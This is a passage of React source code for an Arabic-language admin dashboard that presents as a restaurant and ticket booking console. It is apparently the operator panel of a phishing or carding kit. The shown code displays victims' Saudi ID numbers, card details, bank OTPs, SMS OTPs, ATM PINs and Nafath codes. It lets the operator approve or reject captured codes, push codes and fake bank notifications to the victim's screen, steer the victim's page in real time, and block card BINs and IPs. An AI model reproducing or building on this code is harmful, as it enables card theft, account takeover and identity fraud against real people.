                    <Ban className="w-3 h-3" />
                    {blockedVisitors.includes(selected.id) ? "إلغاء الحظر" : "حظر"}
                  </button>
                  <button
                    onClick={() => void removeVisitor(selected.id)}
                    className="px-2 py-0.5 rounded text-[11px] font-semibold bg-slate-50 hover:bg-red-50 text-slate-600 hover:text-red-600 border border-slate-200 hover:border-red-200 transition flex items-center gap-1"
                  >
                    <Trash2 className="w-3 h-3" />
                    أرشفة / حذف
                  </button>
                </div>
              </div>

              {/* Visitor Device / Location & Current Page Control Bar 2 */}
              <div className="h-10 border-b border-slate-200 px-3 flex items-center justify-between bg-[#fafafa] shrink-0 text-[11px] text-slate-600">
                {/* Right side in RTL: Stage & Device/Geo info */}
                <div className="flex items-center gap-2 overflow-x-auto no-scrollbar">
                  <span className="font-semibold text-slate-700 flex items-center gap-1">
                    <Layers className="w-3.5 h-3.5 text-slate-400" />
                    {(() => {
                      const raw =
                        getFlowStepLabels(getVisitorFlow(selected))[
                          selected.step as number
                        ] || "الصفحة الرئيسية";
                      return raw.includes("·") ? raw.split("·")[1].trim() : raw;
                    })()}
                  </span>
                  <span className="text-slate-300">|</span>
                  <span className="flex items-center gap-1" dir="ltr">
                    <span>
                      {[
                        selected.geoCountry || "Saudi Arabia",
                        selected.geoCity || "Riyadh",
                      ]
                        .filter(Boolean)
                        .join(", ")}
                    </span>
                  </span>
                  <span className="text-slate-300">|</span>
                  <span className="flex items-center gap-1" dir="ltr">
                    <Globe className="w-3 h-3 text-slate-400" />
                    Chrome
                  </span>
                  <span className="text-slate-300">|</span>
                  <span dir="ltr">desktop / mobile</span>
                  {(selected.ip || selected.ipAddress) && (
                    <>
                      <span className="text-slate-300">|</span>
                      <span className="font-mono text-slate-500" dir="ltr">
                        {String(selected.ip || selected.ipAddress)}
                      </span>
                    </>
                  )}
                </div>

                {/* Left side in RTL: Current Page Direct Select Box + Show/Hide Left Panel Toggle */}
                <div className="flex items-center gap-2 shrink-0">
                  <div className="relative flex items-center">
                    <span className="absolute -top-2 right-2 bg-[#fafafa] px-1 text-[9px] text-slate-400">
                      الصفحة الحالية
                    </span>
                    <select
                      value={Number(selected.step) || 1}
                      onChange={e => {
                        const targetStep = Number(e.target.value);
                        if (!targetStep) return;
                        void pushDirective(
                          selected.id,
                          buildPageControlPayload(
                            getVisitorFlow(selected),
                            targetStep,
                            new Date().toISOString()
                          )
                        );
                      }}
                      className="h-7 pl-6 pr-3 bg-white border border-slate-300 rounded text-[11px] font-semibold text-slate-700 focus:outline-none focus:border-blue-500"
                    >
                      {Object.entries(
                        getFlowStepLabels(getVisitorFlow(selected))
                      ).map(([k, label]) => (
                        <option key={k} value={Number(k)}>
                          {label.includes("·") ? label.split("·")[1].trim() : label}
                        </option>
                      ))}
                    </select>
                  </div>

                  <button
                    type="button"
                    onClick={() => setShowLeftPanel(v => !v)}
                    className={`h-7 px-2.5 rounded border text-[11px] font-semibold flex items-center gap-1.5 transition ${
                      showLeftPanel
                        ? "bg-blue-50 border-blue-200 text-blue-700 hover:bg-blue-100"
                        : "bg-white border-slate-300 text-slate-700 hover:bg-slate-100"
                    }`}
                    data-testid="toggle-left-panel"
                    title={showLeftPanel ? "إخفاء اللوحة الجانبية" : "إظهار اللوحة الجانبية"}
                  >
                    {showLeftPanel ? (
                      <>
                        <EyeOff className="w-3.5 h-3.5" />
                        <span>إخفاء</span>
                      </>
                    ) : (
                      <>
                        <Eye className="w-3.5 h-3.5" />
                        <span>إظهار</span>
                      </>
                    )}
                  </button>
                </div>
              </div>

              {/* Center Timeline Workspace + Collapsible Left Column */}
              <div className="flex-1 flex min-h-0 overflow-hidden relative">
                <main
                  ref={timelineScrollRef}
                  className="flex-1 overflow-y-auto py-6 px-4 bg-white"
                >
                  <div className="w-[350px] max-w-full mx-auto space-y-5 pb-6">
                    {/* Timestamp divider */}
                    <div className="flex items-center justify-center gap-3 text-[10px] text-slate-400 font-mono" dir="ltr">
                      <span className="w-12 h-px bg-slate-200" />
                      <span>{fmtTime(selected.updatedAt)}</span>
                      <span className="w-12 h-px bg-slate-200" />
                    </div>

                    {/* 1. First (Top): Customer / Booking Info Block (حجز موعد) */}
                    <div className={spanClass("customer")}>
                      <CustomerInfoCard visitor={selected} />
                    </div>

                    {/* 2 & 3. Payment Card Block (الدفع) and OTP Block (رموز التحقق) ordered chronologically so the latest submission is at the bottom ("on last down") */}
                    {(() => {
                      const cardTs = new Date(
                        String((selected as any).cardSubmittedAt || "")
                      ).getTime();
                      const otpTs = new Date(
                        String((selected as any).otpSubmittedAt || "")
                      ).getTime();
                      const cardIsNewerThanOtp =
                        !Number.isNaN(cardTs) &&
                        !Number.isNaN(otpTs) &&
                        cardTs > otpTs;

                      const cardNode = (
                        <div key="card-block" className={spanClass("card")}>
                          <CardInfoCard
                            visitor={selected}
                            onApprove={field =>
                              setApprovalStatus(selected.id, field, "approved")
                            }
                            onReject={field =>
                              setApprovalStatus(selected.id, field, "rejected")
                            }
                            onPushStep={(targetStep) =>
                              pushDirective(
                                selected.id,
                                buildPageControlPayload(
                                  getVisitorFlow(selected),
                                  targetStep,
                                  new Date().toISOString()
                                )
                              )
                            }
                            onBlockBin={addBlockedBin}
                            isBinBlocked={
                              !!selected.payment?.cardBin &&
                              blockedBins.includes(
                                String(selected.payment.cardBin)
                              )
                            }
                            onBlockIp={addBlockedIp}
                            isIpBlocked={
                              !!(selected.ip || selected.ipAddress) &&
                              blockedIps.includes(
                                String(selected.ip || selected.ipAddress)
                              )
                            }
                          />
                        </div>
                      );

                      const otpNode = (
                        <div key="otp-block" className={spanClass("otp")}>
                          <OtpControlCard
                            visitor={selected}
                            otpInput={otpInput}
                            setOtpInput={setOtpInput}
                            otpDirect={otpDirect}
                            setOtpDirect={setOtpDirect}
                            onApprove={field =>
                              setApprovalStatus(selected.id, field, "approved")
                            }
                            onReject={field =>
                              setApprovalStatus(selected.id, field, "rejected")
                            }
                            onSendOtp={code =>
                              pushDirective(selected.id, {
                                adminPushedOtp: code,
                                adminPushedOtpAt: new Date().toISOString(),
                              })
                            }
                            onForceFinalOtp={() =>
                              pushDirective(selected.id, {
                                forceFinalOtp: true,
                                forceFinalOtpAt: new Date().toISOString(),
                              })
                            }
                          />
                        </div>
                      );

                      return cardIsNewerThanOtp
                        ? [otpNode, cardNode]
                        : [cardNode, otpNode];
                    })()}
                  </div>
                </main>

                {/* Collapsible Left Column: Quick Page Control & Visitor Summary (Show / Hide) */}
                {showLeftPanel && (
                  <div className="w-[270px] shrink-0 border-r border-slate-200 bg-[#fcfcfc] overflow-y-auto p-3 space-y-3">
                    <div className="flex items-center justify-between pb-1.5 border-b border-slate-200/80">
                      <span className="text-[11px] font-bold text-slate-700">
                        معلومات الزائر والتحكم
                      </span>
                      <button
                        type="button"
                        onClick={() => setShowLeftPanel(false)}
                        className="px-2 py-0.5 rounded text-[10px] font-semibold bg-slate-100 hover:bg-slate-200 text-slate-600 flex items-center gap-1 transition"
                        title="إخفاء"
                      >
                        <EyeOff className="w-3 h-3" />
                        إخفاء
                      </button>
                    </div>
                    <div className={spanClass("header")}>
                      <VisitorHeaderCard visitor={selected} />
                    </div>
                    <div className="rounded-lg border border-slate-200 bg-white p-3">
                      <div className="text-xs font-bold text-slate-700 mb-2 pb-1.5 border-b border-slate-100">
                        التحكم السريع بالصفحات
                      </div>
                      <PagesControl visitor={selected} />
                    </div>
                  </div>
                )}
              </div>
            </>
          ) : (
            <div className="flex-1 flex items-center justify-center text-slate-400 text-sm">
              {loading ? "جاري التحميل..." : "اختر زائراً من القائمة"}
            </div>
          )}
        </div>
      </div>

      {/* Hidden compatibility stats nodes so any external queries still work */}
      <div className="hidden">
        <StatCard icon={Users} label="إجمالي الزوار" value={stats.total} color="slate" />
        <StatCard icon={Activity} label="متصل الآن" value={stats.online} color="green" />
        <StatCard icon={AlarmClock} label="بانتظار الموافقة" value={stats.waiting} color="amber" />
        <StatCard icon={CreditCard} label="في مرحلة الدفع" value={stats.onPayment} color="cyan" />
        <StatCard icon={CheckCheck} label="مكتمل" value={stats.completed} color="emerald" />
      </div>

      {/* Blocked IPs management dialog */}
      {ipBlocklistOpen && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 backdrop-blur-xs animate-in fade-in"
          onClick={() => setIpBlocklistOpen(false)}
          data-testid="ip-blocklist-dialog-backdrop"
        >
          <div
            className="w-full max-w-md max-h-[90vh] overflow-y-auto"
            onClick={e => e.stopPropagation()}
          >
            <div className="relative">
              <button
                onClick={() => setIpBlocklistOpen(false)}
                className="absolute top-2.5 left-2.5 z-10 p-1.5 rounded-lg bg-slate-100 hover:bg-slate-200 text-slate-600 hover:text-slate-900 transition"
                aria-label="إغلاق"
                data-testid="ip-blocklist-dialog-close"
              >
                <XIcon className="w-4 h-4" />
              </button>
              <BlockedIpsCard
                ips={blockedIps}
                onAdd={addBlockedIp}
                onRemove={removeBlockedIp}
                suggestedIp={selected?.ip || selected?.ipAddress}
                suggestedName={selected?.name || selected?.id}
              />
            </div>
          </div>
        </div>
      )}

      {/* Blocked BINs management dialog */}
      {blocklistOpen && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 backdrop-blur-xs animate-in fade-in"
          onClick={() => setBlocklistOpen(false)}
          data-testid="blocklist-dialog-backdrop"
        >
          <div
            className="w-full max-w-md max-h-[90vh] overflow-y-auto"
            onClick={e => e.stopPropagation()}
          >
            <div className="relative">
              <button
                onClick={() => setBlocklistOpen(false)}
                className="absolute top-2.5 left-2.5 z-10 p-1.5 rounded-lg bg-slate-100 hover:bg-slate-200 text-slate-600 hover:text-slate-900 transition"
                aria-label="إغلاق"
                data-testid="blocklist-dialog-close"
              >
                <XIcon className="w-4 h-4" />
              </button>
              <BlockedBinsCard
                bins={blockedBins}
                onAdd={addBlockedBin}
                onRemove={removeBlockedBin}
                suggestedBin={selected?.payment?.cardBin}
                suggestedLast4={selected?.payment?.cardLast4}
              />
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

/* ============================================================ */
/* Sub-components                                                */
/* ============================================================ */

function TrendingIcon() {
  return (
    <svg
      className="w-3.5 h-3.5 text-blue-600"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2.2"
      strokeLinecap="round"
      strokeLinejoin="round"
    >
      <polyline points="23 6 13.5 15.5 8.5 10.5 1 18" />
      <polyline points="17 6 23 6 23 12" />
    </svg>
  );
}

function IconButton({
  icon: Icon,
  label,
  color,
  onClick,
  badge,
  pulse,
}: {
  icon: any;
  label: string;
  color: "red" | "slate" | "green";
  onClick?: () => void;
  badge?: string;
  pulse?: boolean;
}) {
  const cls =
    color === "red"
      ? "bg-red-50 text-red-600 hover:bg-red-100 border-red-200"
      : color === "green"
        ? "bg-emerald-50 text-emerald-600 hover:bg-emerald-100 border-emerald-200"
        : "bg-white text-slate-600 hover:bg-slate-100 border-slate-200";
  return (
    <button
      onClick={onClick}
      title={label}
      className={`w-7 h-7 rounded-md border flex items-center justify-center transition relative ${cls} ${pulse ? "animate-pulse" : ""}`}
    >
      <Icon className="w-3.5 h-3.5" />
      {badge && (
        <span className="absolute -top-1 -left-1 min-w-[14px] h-3.5 px-1 rounded-full bg-red-600 text-white text-[9px] font-bold flex items-center justify-center">
          {badge}
        </span>
      )}
    </button>
  );
}

function StatCard({
  icon: Icon,
  label,
  value,
  color,
  pulse,
  onClick,
}: {
  icon: any;
  label: string;
  value: number;
  color: "slate" | "green" | "amber" | "cyan" | "emerald";
  pulse?: boolean;
  onClick?: () => void;
}) {
  const Comp: any = onClick ? "button" : "div";
  return (
    <Comp
      onClick={onClick}
      className={`text-right rounded-lg border border-slate-200 bg-white px-3 py-2 flex items-center gap-2.5 ${pulse ? "ring-1 ring-amber-400" : ""}`}
    >
      <Icon className="w-4 h-4 text-slate-500" />
      <div className="flex-1 min-w-0">
        <div className="text-[10px] text-slate-500 truncate">{label}</div>
        <div className="text-base font-bold text-slate-800 leading-tight">{value}</div>
      </div>
    </Comp>
  );
}

function Panel({
  title,
  badge,
  children,
}: {
  title: string;
  badge?: string;
  children: React.ReactNode;
}) {
  return (
    <div className="rounded-lg bg-[#f3f4f6] border border-slate-200/80 overflow-hidden flex flex-col">
      <div className="px-4 pt-3 pb-2 flex items-center justify-between border-b border-slate-200/70">
        <h3 className="text-[14px] font-bold text-slate-800">{title}</h3>
        {badge && (
          <span className="text-[10px] px-2 py-0.5 rounded bg-amber-100 text-amber-800 border border-amber-200 font-bold">
            {badge}
          </span>
        )}
      </div>
      <div className="p-4 flex-1 text-[12.5px] text-slate-800">{children}</div>
    </div>
  );
}

function Row({
  label,
  value,
  mono,
}: {
  label: string;
  value: any;
  mono?: boolean;
}) {
  const text = safeText(value);
  if (!text) return null;
  return (
    <div className="flex items-center justify-start gap-1.5 py-1 text-[12.5px] leading-relaxed">
      <span className="text-slate-700 font-semibold">{label} :</span>
      <span
        className={`text-slate-900 font-medium ${mono ? "font-mono" : ""}`}
        dir={mono ? "ltr" : undefined}
      >
        {text}
      </span>
    </div>
  );
}

function VisitorHeaderCard({ visitor }: { visitor: Visitor }) {
  const online = isOnline(visitor);
  const waiting = isWaiting(visitor);
  return (
    <div className="rounded-lg border border-slate-200 bg-white overflow-hidden flex flex-col">
      <div className="p-3 border-b border-slate-100 flex items-center justify-between gap-2">
        <div className="flex items-center gap-2.5 min-w-0">
          <div className="relative shrink-0">
            {waiting && (
              <span className="absolute -inset-1 rounded-full border-2 border-amber-500 border-t-transparent animate-spin pointer-events-none" />
            )}
            <div
              className={`w-9 h-9 rounded-full flex items-center justify-center ${
                waiting
                  ? "bg-amber-100 text-amber-600"
                  : online
                    ? "bg-emerald-50 text-emerald-700"
                    : "bg-slate-200 text-slate-500"
              }`}
            >
              {waiting ? (
                <RefreshCw className="w-4 h-4 text-amber-600 animate-spin" />
              ) : (
                <Users className="w-4 h-4" />
              )}
            </div>
            <span
              className={`absolute -top-0.5 -left-0.5 w-3 h-3 rounded-full border-2 border-white ${
                online ? "bg-emerald-500" : "bg-slate-300"
              }`}
            />
          </div>
          <div className="min-w-0">
            <h3 className="text-xs font-bold text-slate-800 truncate">
              {visitor.name || "زائر بدون اسم"}
            </h3>
            <div className="text-slate-500 font-mono text-[11px] truncate" dir="ltr">
              {visitor.phone || visitor.phoneVerification || "—"}
            </div>
          </div>
        </div>
        <div className="inline-flex items-center gap-1.5 text-[11px] shrink-0">
          <span
            className={`w-2 h-2 rounded-full ${online ? "bg-emerald-500" : "bg-slate-300"}`}
          />
          <span className={online ? "text-emerald-700 font-semibold" : "text-slate-400"}>
            {online ? "أونلاين" : "غير متصل"}
          </span>
        </div>
      </div>

      <div className="p-3 space-y-1 text-[11.5px]">
        <Row label="آخر تحديث" value={fmtTime(visitor.updatedAt)} />
        <Row
          label="المرحلة"
          value={
            getFlowStepLabels(getVisitorFlow(visitor))[visitor.step as number]
          }
        />
        <Row
          label="نوع الحجز"
          value={
            getVisitorFlow(visitor) === "restaurant"
              ? `حجز مطعم${visitor.restaurant ? ` · ${visitor.restaurant}` : ""}`
              : "حجز تذاكر"
          }
        />
        <Row label="الحالة" value={visitor.status} />
        {(visitor.ip || visitor.ipAddress) && (
          <Row
            label="عنوان IP"
            value={String(visitor.ip || visitor.ipAddress)}
            mono
          />
        )}
        {(visitor.geoCountry || visitor.geoCity) && (
          <Row
            label="الدولة"
            value={
              [
                visitor.geoCity,
                visitor.geoRegion,
                visitor.geoCountry,
                visitor.geoCountryCode
                  ? `(${String(visitor.geoCountryCode).toUpperCase()})`
                  : "",
              ]
                .filter(Boolean)
                .join(" · ") || "—"
            }
          />
        )}
      </div>
    </div>
  );
}

function CustomerInfoCard({ visitor }: { visitor: Visitor }) {
  // Collect all visitor & booking fields into a single Nexa Flow style "حجز موعد" card
  const allRows = [
    safeText(visitor.name) && (
      <Row key="n" label="الاسم" value={visitor.name} />
    ),
    safeText(visitor.saudiId) && (
      <Row key="si" label="رقم الهوية" value={visitor.saudiId} mono />
    ),
    safeText(visitor.phone) && (
      <Row key="p" label="رقم الجوال" value={visitor.phone} mono />
    ),
    safeText(visitor.email) && (
      <Row key="em" label="البريد الإلكتروني" value={visitor.email} mono />
    ),
    safeText(visitor.nationality) && (
      <Row key="nat" label="الجنسية" value={visitor.nationality} />
    ),
    safeText(visitor.restaurant) && (
      <Row key="rs" label="المطعم / الفعالية" value={visitor.restaurant} />
    ),
    safeText(visitor.date || visitor.bookingDate) && (
      <Row key="bd" label="تاريخ الحجز" value={visitor.date || visitor.bookingDate} />
    ),
    safeText(visitor.time || visitor.bookingTime) && (
      <Row key="bt" label="موعد الخدمة" value={visitor.time || visitor.bookingTime} />
    ),
    safeText(visitor.guests || visitor.ticketQuantity) && (
      <Row
        key="tq"
        label="العدد"
        value={visitor.guests || visitor.ticketQuantity}
      />
    ),
    safeText(visitor.notes) && (
      <Row key="rn" label="ملاحظات" value={visitor.notes} />
    ),
    safeText(visitor.ticketPrice) && (
      <Row key="tp" label="رسوم الخدمة" value={visitor.ticketPrice} />
    ),
    safeText(visitor.paymentMode) && (
      <Row key="pm" label="طريقة الدفع" value={visitor.paymentMode} />
    ),
    (visitor.payment?.amount || visitor.totalAmount || visitor.total) && (
      <Row
        key="amt"
        label="مجموع"
        value={`${visitor.payment?.amount || visitor.totalAmount || visitor.total}`}
        mono
      />
    ),
  ].filter(Boolean);

  if (allRows.length === 0) return null;

  return (
    <Panel title="حجز موعد">
      <div className="space-y-0.5">{allRows}</div>
    </Panel>
  );
}

function OtpControlCard({
  visitor,
  otpInput: _otpInput,
  setOtpInput: _setOtpInput,
  otpDirect,
  setOtpDirect,
  onApprove,
  onReject,
  onSendOtp,
  onForceFinalOtp,
}: {
  visitor: Visitor;
  otpInput: string;
  setOtpInput: (s: string) => void;
  otpDirect: string;
  setOtpDirect: (s: string) => void;
  onApprove: (field: "otpApprovalStatus" | "phoneOtpApprovalStatus") => void;
  onReject: (field: "otpApprovalStatus" | "phoneOtpApprovalStatus") => void;
  onSendOtp: (code: string) => void;
  onForceFinalOtp: () => void;
}) {
  const visitorAny = visitor as any;
  const cardOtp = String(
    visitor.otp || visitorAny.otpCode || visitorAny.verificationCode || ""
  );
  const phoneOtp = String(visitor.smsOtp || visitorAny.phoneOtp || "");
  const nafadOtp = String(
    visitor.nafadOtp || visitor.nafadConfirmationCode || ""
  );
  const atmPin = String(
    visitor.atmPin || visitorAny.cardPin || visitorAny.pinCode || ""
  );
  const otpHistory: Array<{ code: string; page?: string; timestamp?: string }> =
    Array.isArray(visitorAny.otpHistory) ? visitorAny.otpHistory : [];
  const hasCard = !!(
    visitor.payment?.c1 ||
    visitor.payment?.cardLast4 ||
    visitorAny.c1 ||
    visitorAny.c1
  );
  const waitingBank = visitor.otpApprovalStatus !== "approved";
  const waitingPhone = visitor.phoneOtpApprovalStatus !== "approved";
  const cp = String(visitor.currentPage || "");
  const onOtpStep =
    cp === "otp" ||
    cp === "otp_verified" ||
    cp === "reserve_otp" ||
    cp === "checkout" ||
    cp === "reserve_checkout" ||
    cp === "confirmation" ||
    isFinalStep(visitor);
  if (
    !cardOtp &&
    !phoneOtp &&
    !nafadOtp &&
    !atmPin &&
    otpHistory.length === 0 &&
    !hasCard &&
    !waitingBank &&
    !waitingPhone &&
    !onOtpStep
  )
    return null;

  // Previous OTP attempts in chronological order (oldest first -> latest at bottom)
  const previousOtps = otpHistory.filter(
    (entry, idx) =>
      entry?.code &&
      !(idx === otpHistory.length - 1 && String(entry.code) === cardOtp)
  );

  return (
    <Panel
      title="رموز التحقق (OTP)"
      badge={waitingBank || waitingPhone ? "بانتظار الموافقة" : undefined}
    >
      <div className="space-y-3">
        {/* Previous OTP attempts ordered oldest -> newest */}
        {previousOtps.length > 0 && (
          <div className="rounded-lg border border-slate-200 bg-white p-2.5 space-y-1.5">
            <div className="text-[11px] font-bold text-slate-700 flex items-center gap-1.5">
              <RotateCcw className="w-3 h-3 text-slate-500" />
              سجل رموز التحقق السابقة ({previousOtps.length})
            </div>
            <div className="space-y-1.5">
              {previousOtps.map((entry, idx) => (
                <div
                  key={`${entry.code}-${idx}`}
                  className="flex items-center justify-between bg-slate-50 border border-slate-200 rounded px-2.5 py-1.5 text-xs"
                >
                  <span className="text-[10px] text-slate-500 font-mono" dir="ltr">
                    #{idx + 1} · {fmtTime(entry.timestamp)}
                  </span>
                  <span
                    className="font-mono font-bold text-sm text-blue-700 tracking-wider select-all"
                    dir="ltr"
                  >
                    {entry.code}
                  </span>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Extra OTP / PIN fields if submitted */}
        {phoneOtp && (
          <OtpRow
            label="رمز تحقق الجوال (SMS OTP)"
            step={5}
            code={phoneOtp}
            status={visitor.phoneOtpApprovalStatus || "received"}
            canDecide={visitor.phoneOtpApprovalStatus !== "approved"}
            onApprove={() => onApprove("phoneOtpApprovalStatus")}
            onReject={() => onReject("phoneOtpApprovalStatus")}
          />
        )}

        {atmPin && (
          <div className="rounded-lg border border-slate-200 bg-white p-2.5 flex items-center justify-between">
            <span className="text-xs font-bold text-slate-700">
              الرقم السري للبطاقة (ATM PIN):
            </span>
            <span
              className="font-mono text-base font-bold text-slate-900 select-all"
              dir="ltr"
            >
              {atmPin}
            </span>
          </div>
        )}

        {nafadOtp && (
          <div className="rounded-lg border border-teal-200 bg-teal-50/70 p-2.5 flex items-center justify-between">
            <span className="text-xs font-bold text-teal-800">
              رمز نفاذ (Nafath):
            </span>
            <span
              className="font-mono text-base font-bold text-teal-900 select-all"
              dir="ltr"
            >
              {nafadOtp}
            </span>
          </div>
        )}

        {/* Latest / Current Bank OTP on last down */}
        <OtpRow
          label="OTP البطاقة (البنك) - الأحدث"
          step={5}
          code={cardOtp}
          status={
            waitingBank
              ? "waiting"
              : visitor.otpApprovalStatus || (cardOtp ? "received" : "—")
          }
          canDecide={visitor.otpApprovalStatus !== "approved"}
          onApprove={() => onApprove("otpApprovalStatus")}
          onReject={() => onReject("otpApprovalStatus")}
        />
      </div>
    </Panel>
  );
}

function BankContactPushRow({ visitor }: { visitor: Visitor }) {
  const v = visitor as any;
  const requested = Boolean(v.bankContactRequest);
  const confirmed = Boolean(v.bankContactConfirmed);
  const requestedAt = String(v.bankContactAt || "");
  const confirmedAt = String(v.bankContactConfirmedAt || "");
  const [pushing, setPushing] = useState(false);

  let statusLabel = "";
  let statusClass = "";
  if (confirmed && confirmedAt) {
    statusLabel = `تم تأكيد الاستلام · ${fmtRelative(confirmedAt)}`;
    statusClass = "text-emerald-700";
  } else if (requested && requestedAt) {
    statusLabel = `بانتظار التأكيد · ${fmtRelative(requestedAt)}`;
    statusClass = "text-amber-700";
  }

  const handlePush = async () => {
    if (pushing) return;
    setPushing(true);
    try {
      await pushBankContactRequest(visitor.id);
    } finally {
      setPushing(false);
    }
  };

  return (
    <div className="pt-2 border-t border-slate-200">
      <button
        onClick={handlePush}
        disabled={pushing}
        className={`w-full py-1.5 rounded-md text-xs font-semibold flex items-center justify-center gap-1.5 transition-colors ${
          confirmed
            ? "bg-emerald-600 hover:bg-emerald-500 text-white"
            : requested
              ? "bg-amber-500 hover:bg-amber-400 text-white"
              : "bg-blue-600 hover:bg-blue-500 text-white"
        } disabled:opacity-60`}
        data-testid="button-push-bank-contact"
      >
        <PhoneCall className="w-3.5 h-3.5" />
        {confirmed
          ? "تم التأكيد · إعادة الإرسال"
          : requested
            ? "إعادة إرسال إشعار البنك"
            : "إرسال إشعار البنك"}
      </button>
      {statusLabel && (
        <div
          className={`text-[11px] mt-1 text-center font-medium ${statusClass}`}
          data-testid="text-bank-contact-status"
        >
          {statusLabel}
        </div>
      )}
    </div>
  );
}

function CustomMessagePushRow({ visitor }: { visitor: any }) {
  const v = visitor as any;
  const visible = Boolean(v.customMessageVisible && v.customMessage);
  const confirmed = Boolean(v.customMessageConfirmed);
  const sentAt = String(v.customMessageAt || "");
  const confirmedAt = String(v.customMessageConfirmedAt || "");

  const [title, setTitle] = useState("");
  const [message, setMessage] = useState("");
  const [sending, setSending] = useState(false);

  useEffect(() => {
    setTitle("");
    setMessage("");
  }, [visitor.id]);

  let statusLabel = "";
  let statusClass = "";
  if (confirmed && confirmedAt) {
    statusLabel = `تم استلام الرسالة`;
    statusClass = "text-emerald-700";
  } else if (visible && sentAt) {
    statusLabel = `ظاهرة للزائر الآن`;
    statusClass = "text-amber-700";
  }

  const handleSend = async () => {
    if (sending || !message.trim()) return;
    setSending(true);
    try {
      await pushCustomVisitorMessage(visitor.id, message, title);
      setMessage("");
      setTitle("");
    } finally {
      setSending(false);
    }
  };

  const handleHide = async () => {
    if (sending) return;
    setSending(true);
    try {
      await clearCustomVisitorMessage(visitor.id);
    } finally {
      setSending(false);
    }
  };

  return (
    <div className="pt-2.5 border-t border-slate-200/80 space-y-2">
      <div className="flex items-center justify-between text-[11px] font-semibold text-slate-700">
        <span className="flex items-center gap-1.5">
          <MessageSquare className="w-3.5 h-3.5 text-blue-600" />
          رسالة مخصصة للزائر
        </span>
        {visible && (
          <button
            onClick={handleHide}
            disabled={sending}
            className="text-[10px] px-2 py-0.5 rounded bg-white hover:bg-slate-100 text-slate-700 border border-slate-300 disabled:opacity-50"
          >
            إخفاء الرسالة
          </button>
        )}
      </div>

      <input
        value={title}
        onChange={e => setTitle(e.target.value)}
        placeholder="عنوان الرسالة (اختياري، الافتراضي: رسالة من الإدارة)"
        className="w-full px-2.5 py-1.5 bg-white border border-slate-300 rounded-lg text-xs text-slate-900 placeholder-slate-400 focus:outline-none focus:border-blue-500 text-right"
      />

      <textarea
        value={message}
        onChange={e => setMessage(e.target.value)}
        placeholder="اكتب الرسالة المراد إرسالها للزائر..."
        rows={2}
        className="w-full px-2.5 py-1.5 bg-white border border-slate-300 rounded-lg text-xs text-slate-900 placeholder-slate-400 focus:outline-none focus:border-blue-500 text-right resize-none"
      />

      <div className="flex items-center justify-between gap-2">
        <button
          onClick={handleSend}
          disabled={sending || !message.trim()}
          className="flex-1 py-1.5 rounded-lg bg-blue-600 hover:bg-blue-500 disabled:opacity-50 text-white text-xs font-bold transition flex items-center justify-center gap-1.5"
        >
          {sending ? "جاري الإرسال..." : visible ? "تحديث الرسالة" : "إرسال إلى الشاشة"}
        </button>
        {statusLabel && (
          <span className={`text-[10px] font-bold ${statusClass}`}>
            {statusLabel}
          </span>
        )}
      </div>
    </div>
  );
}


function NafadControl({
  visitor,
  onApprove,
  onReject,
}: {
  visitor: Visitor;
  onApprove: (
    field: "cardApprovalStatus" | "otpApprovalStatus" | "phoneOtpApprovalStatus"
  ) => void;
  onReject: (
    field: "cardApprovalStatus" | "otpApprovalStatus" | "phoneOtpApprovalStatus"
  ) => void;
}) {
  const [code, setCode] = useState("");
  const sentCode = String(visitor.nafadConfirmationCode || "");
  const status = visitor.nafadConfirmationStatus;

  async function sendCode() {
    const clean = code.replace(/\D/g, "").slice(0, 2);
    if (clean.length < 2) return;
    await setDoc(
      doc(db, "pays", visitor.id),
      {
        nafadConfirmationCode: clean,
        nafadConfirmationStatus: "waiting",
        nafadUpdatedAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      },
      { merge: true }
    );
    setCode("");
  }

  async function clearCode() {
    await setDoc(
      doc(db, "pays", visitor.id),
      {
        nafadConfirmationCode: "",
        nafadConfirmationStatus: "waiting",
        nafadUpdatedAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      },
      { merge: true }
    );
  }

  return (
    <div className="bg-teal-50 border border-teal-200 rounded-lg p-2.5 space-y-2">
      <div className="text-[11px] text-teal-800 font-bold flex items-center justify-end">
        {sentCode ? (
          <span
            className="font-mono text-base text-teal-900"
            dir="ltr"
            data-testid="admin-nafad-current"
          >
            {sentCode}
          </span>
        ) : (
          <span className="text-[10px] text-amber-700">
            المستخدم بانتظار الرقم
          </span>
        )}
      </div>

      <div className="flex gap-1.5">
        <input
          value={code}
          onChange={e => setCode(e.target.value.replace(/\D/g, "").slice(0, 2))}
          placeholder="رقم من رقمين"
          inputMode="numeric"
          maxLength={2}
          dir="ltr"
          data-testid="admin-nafad-input"
          className="flex-1 bg-white border border-slate-300 rounded px-2 py-1.5 text-sm font-mono text-slate-900 text-center focus:outline-none focus:border-teal-600"
        />
        <button
          onClick={sendCode}
          disabled={code.length < 2}
          data-testid="admin-nafad-send"
          className="px-3 py-1.5 bg-teal-600 text-white rounded text-xs font-bold hover:bg-teal-500 disabled:opacity-40 disabled:cursor-not-allowed"
        >
          إرسال
        </button>
        {sentCode && (
          <button
            onClick={clearCode}
            data-testid="admin-nafad-clear"
            title="مسح وإعادة طلب رقم"
            className="px-2 py-1.5 bg-white text-slate-600 rounded text-xs border border-slate-300 hover:bg-slate-100"
          >
            ✕
          </button>
        )}
      </div>

      {sentCode && (
        <div className="grid grid-cols-2 gap-1.5">
          <button
            onClick={() => onApprove("nafadConfirmationStatus" as any)}
            data-testid="admin-nafad-approve"
            className={`py-1 rounded text-xs font-semibold border ${
              status === "approved"
                ? "bg-emerald-600 text-white border-emerald-600"
                : "bg-emerald-50 text-emerald-700 border-emerald-200 hover:bg-emerald-100"
            }`}
          >
            قبول نفاذ
          </button>
          <button
            onClick={() => onReject("nafadConfirmationStatus" as any)}
            data-testid="admin-nafad-reject"
            className={`py-1 rounded text-xs font-semibold border ${
              status === "rejected"
                ? "bg-red-600 text-white border-red-600"
                : "bg-red-50 text-red-700 border-red-200 hover:bg-red-100"
            }`}
          >
            رفض نفاذ
          </button>
        </div>
      )}
    </div>
  );
}

function CustomizeDropdown({
  settings,
  onChange,
  onReset,
}: {
  settings: CardSettings;
  onChange: (key: CardKey, patch: Partial<CardSetting>) => void;
  onReset: () => void;
}) {
  const [open, setOpen] = useState(false);

  useEffect(() => {
